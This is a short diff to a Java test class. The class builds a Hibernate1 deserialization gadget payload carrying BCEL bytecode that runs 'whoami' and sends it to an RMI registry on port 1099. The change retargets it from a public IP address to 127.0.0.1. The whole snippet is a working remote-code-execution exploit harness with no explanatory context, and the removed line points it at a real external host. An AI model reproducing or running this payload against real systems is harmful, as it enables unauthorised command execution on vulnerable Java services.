@@ -7,7 +7,7 @@ public class Test {
         String bcelStr = CommonUtil.getEchoExeCode("whoami");
         bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
         Object objPayload = CommonUtil.generator("Hibernate1", String.format("code_base64:%s", bcelStr));
-        String res = RMIRegistryExploit.sendPayload("120.76.221.115",1099, objPayload);
+        String res = RMIRegistryExploit.sendPayload("127.0.0.1",1099, objPayload);
         System.out.println(res);
     }
 }
